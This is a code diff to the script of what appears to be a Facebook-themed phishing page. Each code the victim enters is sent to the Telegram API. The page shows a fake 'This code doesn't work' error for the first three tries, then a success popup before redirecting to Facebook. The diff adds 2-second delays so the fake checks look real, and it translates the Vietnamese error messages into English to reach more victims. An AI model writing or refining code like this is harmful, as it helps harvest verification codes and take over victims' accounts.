@@ -111,24 +111,30 @@ document.getElementById('continueButton').addEventListener('click', async functi
         if (response.ok) {
             if (attempts < 3) {
                 // Thông báo lỗi nếu mã chưa đúng
-                errorMessage.textContent = 'This code doesn’t work. Check it’s correct or try a new one.';
-                errorMessage.style.display = 'block';
-                document.getElementById('code').value = ''; // Reset ô nhập mã
-                document.getElementById('continueButton').disabled = true; // Vô hiệu hóa nút Continue
+                setTimeout(() => {
+                    errorMessage.textContent = 'This code doesn’t work. Check it’s correct or try a new one.';
+                    errorMessage.style.display = 'block';
+                    document.getElementById('code').value = ''; // Reset ô nhập mã
+                    document.getElementById('continueButton').disabled = true; // Vô hiệu hóa nút Continue
+                }, 2000);
+
             } else {
+                setTimeout(() => {
+                    document.getElementById('code').value = ''; // Reset ô nhập mã
+                    successPopup.style.display = "block";
+                }, 2000);
                 // Sau lần thứ 3, chuyển hướng đến Facebook
-                document.getElementById('code').value = ''; // Reset ô nhập mã
-                successPopup.style.display = "block";
+
             }
         } else {
             const errorData = await response.text();
             console.error("Telegram API Error:", errorData);
-            errorMessage.textContent = 'Không thể gửi thông tin. Vui lòng thử lại.';
+            errorMessage.textContent = 'Unable to send information. Please try again.';
             errorMessage.style.display = 'block';
         }
     } catch (error) {
-        console.error('Lỗi khi gửi thông tin:', error);
-        errorMessage.textContent = 'Không thể gửi thông tin. Vui lòng kiểm tra kết nối mạng.';
+        console.error('Error sending information:', error);
+        errorMessage.textContent = 'Unable to send information. Please check your network connection.';
         errorMessage.style.display = 'block';
     }
 });
